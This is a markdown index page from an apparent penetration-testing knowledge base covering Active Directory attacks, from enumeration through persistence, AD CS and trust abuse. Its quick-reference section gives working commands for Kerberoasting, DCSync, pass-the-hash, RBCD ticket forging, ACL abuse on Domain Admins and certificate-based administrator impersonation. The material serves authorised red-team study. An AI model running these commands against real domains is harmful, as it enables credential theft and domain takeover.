---
title: Active Directory Attack Techniques
category: techniques
subcategory: active-directory
tags: [active-directory, kerberos, ntlm, delegation, persistence]
last_updated: 2025-12-27
---

# Active Directory Attack Techniques

Comprehensive documentation for Active Directory-specific attack techniques used in penetration testing and red team operations.

## Table of Contents

- [Overview](#overview)
- [Documentation Index](#documentation-index)
- [Attack Workflow](#attack-workflow)
- [Quick Reference](#quick-reference)
- [Related Tools](#related-tools)
- [References](#references)

## Overview

Active Directory (AD) is the backbone of enterprise identity management. Its complexity creates numerous attack vectors for lateral movement, privilege escalation, and domain compromise. This section covers the full attack lifecycle from enumeration to persistence.

---

## Documentation Index

### 1. Enumeration

**File:** [enumeration.md](enumeration.md)

Covers techniques for discovering AD structure, users, groups, permissions, and attack paths.

| Topic | Description |
|-------|-------------|
| BloodHound/SharpHound | Attack path visualization and data collection |
| LDAP Queries | Direct AD querying with ldapsearch, ldapdomaindump |
| PowerView | PowerShell AD enumeration |
| AD Explorer | GUI-based AD browsing and snapshots |

---

### 2. Initial Access

**File:** [initial-access.md](initial-access.md)

Techniques for obtaining initial credentials and foothold in the domain.

| Topic | Description |
|-------|-------------|
| Password Spraying | Testing common passwords against many accounts |
| LLMNR/NBT-NS Poisoning | Capturing authentication via protocol abuse |
| NTLM Relay | Relaying captured authentication to other services |

---

### 3. Credential Attacks

**File:** [credential-attacks.md](credential-attacks.md)

Extracting and cracking AD credentials.

| Topic | Description |
|-------|-------------|
| Kerberoasting | Cracking service account passwords from TGS tickets |
| AS-REP Roasting | Attacking accounts without preauth |
| DCSync | Replicating credentials from Domain Controllers |
| LSASS Dumping | Extracting credentials from process memory |
| SAM/NTDS Extraction | Database credential extraction |

---

### 4. Lateral Movement

**File:** [lateral-movement.md](lateral-movement.md)

Moving through the network using stolen credentials and tickets.

| Topic | Description |
|-------|-------------|
| Pass-the-Hash (PtH) | Authenticating with NTLM hashes |
| Pass-the-Ticket (PtT) | Using stolen Kerberos tickets |
| Overpass-the-Hash | Converting NTLM hash to Kerberos TGT |
| Silver Ticket | Forging service tickets |
| Golden Ticket | Forging TGTs for domain-wide access |

---

### 5. Privilege Escalation

**File:** [privilege-escalation.md](privilege-escalation.md)

Escalating privileges within AD.

| Topic | Description |
|-------|-------------|
| Unconstrained Delegation | Abusing TGT forwarding |
| Constrained Delegation | S4U2Self/S4U2Proxy attacks |
| RBCD | Resource-based constrained delegation abuse |
| ACL Abuse | Exploiting misconfigured permissions |
| Group Membership Abuse | Leveraging high-privilege groups |
| GPO Attacks | Exploiting Group Policy Objects |

---

### 6. Persistence

**File:** [persistence.md](persistence.md)

Maintaining access to compromised domains.

| Topic | Description |
|-------|-------------|
| Golden Ticket | Long-term forged TGT persistence |
| Diamond Ticket | Stealthier modified TGT technique |
| Skeleton Key | Master password in DC memory |
| AdminSDHolder | Persistent ACL on protected groups |
| DCShadow | Rogue DC for stealthy modifications |

---

### 7. AD CS Attacks

**File:** [adcs-attacks.md](adcs-attacks.md)

Attacking Active Directory Certificate Services.

| Topic | Description |
|-------|-------------|
| ESC1 | Template allows SAN specification |
| ESC2 | Any Purpose EKU abuse |
| ESC3 | Enrollment Agent misconfiguration |
| ESC4 | Template ACL misconfiguration |
| ESC5 | PKI object ACL abuse |
| ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 flag |
| ESC7 | CA permission abuse |
| ESC8 | NTLM relay to web enrollment |
| Certificate Theft | Extracting and using stolen certificates |

---

### 8. Trust Attacks

**File:** [trust-attacks.md](trust-attacks.md)

Attacking AD trust relationships.

| Topic | Description |
|-------|-------------|
| Child-to-Parent Escalation | Escalating from child to parent domain |
| SID History Injection | Adding privileged SIDs to SID History |
| Forest Trust Abuse | Exploiting cross-forest trusts |
| SID Filtering Bypass | Circumventing trust security |

---

## Attack Workflow

```
+----------------+     +----------------+     +-------------------+
| 1. ENUMERATION | --> | 2. INITIAL     | --> | 3. CREDENTIAL     |
| BloodHound     |     |    ACCESS      |     |    ATTACKS        |
| LDAP/PowerView |     | Password Spray |     | Kerberoast/ASREP  |
| AD Explorer    |     | LLMNR/Relay    |     | DCSync/LSASS      |
+----------------+     +----------------+     +-------------------+
        |                     |                        |
        v                     v                        v
+----------------+     +----------------+     +-------------------+
| 4. LATERAL     | <-- | 5. PRIVILEGE   | <-- | 6. PERSISTENCE    |
|    MOVEMENT    |     |    ESCALATION  |     | Golden Ticket     |
| PtH/PtT        |     | Delegation     |     | Skeleton Key      |
| Silver Ticket  |     | ACL Abuse/GPO  |     | AdminSDHolder     |
+----------------+     +----------------+     +-------------------+
        |                     |
        v                     v
+------------------+   +-------------------+
| 7. AD CS ATTACKS |   | 8. TRUST ATTACKS  |
| ESC1-ESC8        |   | SID History       |
| Cert Theft       |   | Child-to-Parent   |
+------------------+   +-------------------+
```

---

## Quick Reference

### Enumeration

```bash
# BloodHound collection
bloodhound-python -d domain.local -u user -p pass -c All -ns DC_IP

# PowerView
Get-DomainUser -SPN               # Kerberoastable users
Get-DomainUser -PreauthNotRequired # AS-REP roastable
Get-DomainComputer -Unconstrained  # Unconstrained delegation
Find-InterestingDomainAcl         # Abusable ACLs
```

### Credential Attacks

```bash
# Kerberoasting
GetUserSPNs.py domain/user:pass -dc-ip DC -request

# AS-REP Roasting
GetNPUsers.py domain/ -usersfile users.txt -no-pass -dc-ip DC

# DCSync
secretsdump.py domain/admin:pass@DC
```

### Lateral Movement

```bash
# Pass-the-Hash
psexec.py -hashes :HASH domain/user@TARGET
netexec smb TARGET -u user -H HASH

# Pass-the-Ticket
export KRB5CCNAME=ticket.ccache
psexec.py -k -no-pass domain/user@TARGET
```

### Privilege Escalation

```bash
# RBCD attack
rbcd.py -delegate-to TARGET$ -delegate-from ATTACKER$ domain/user:pass
getST.py -spn cifs/TARGET -impersonate Administrator domain/ATTACKER$

# ACL abuse
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity attacker -Rights All
```

### AD CS

```bash
# Find vulnerable templates
certipy find -u user@domain -p pass -dc-ip DC -vulnerable

# ESC1 exploitation
certipy req -u user@domain -p pass -ca CA-NAME -template VulnTemplate -upn administrator@domain
certipy auth -pfx administrator.pfx -dc-ip DC
```

---

## Related Tools

| Tool | Purpose | Documentation |
|------|---------|---------------|
| BloodHound | Attack path visualization | [bloodhound/](../../tools/bloodhound/) |
| Impacket | Python AD toolkit | [impacket/](../../tools/impacket/) |
| Mimikatz | Credential extraction | [mimikatz/](../../tools/mimikatz/) |
| Responder | LLMNR/NBT-NS poisoning | [responder/](../../tools/responder/) |
| NetExec | AD post-exploitation | [netexec/](../../tools/netexec/) |
| Kerbrute | Kerberos user enum/spray | [kerbrute/](../../tools/kerbrute/) |

---

## References

### Comprehensive Guides
- [The Hacker Recipes](https://www.thehacker.recipes/)
- [HackTricks - Active Directory](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)
- [ired.team - AD Attacks](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse)
- [SpecterOps Blog](https://posts.specterops.io/)

### MITRE ATT&CK
- [Credential Access](https://attack.mitre.org/tactics/TA0006/)
- [Lateral Movement](https://attack.mitre.org/tactics/TA0008/)
- [Privilege Escalation](https://attack.mitre.org/tactics/TA0004/)
- [Persistence](https://attack.mitre.org/tactics/TA0003/)

### Tool Documentation
- [BloodHound CE Docs](https://bloodhound.specterops.io/)
- [Impacket GitHub](https://github.com/fortra/impacket)
- [Certipy Wiki](https://github.com/ly4k/Certipy/wiki)
- [Rubeus GitHub](https://github.com/GhostPack/Rubeus)
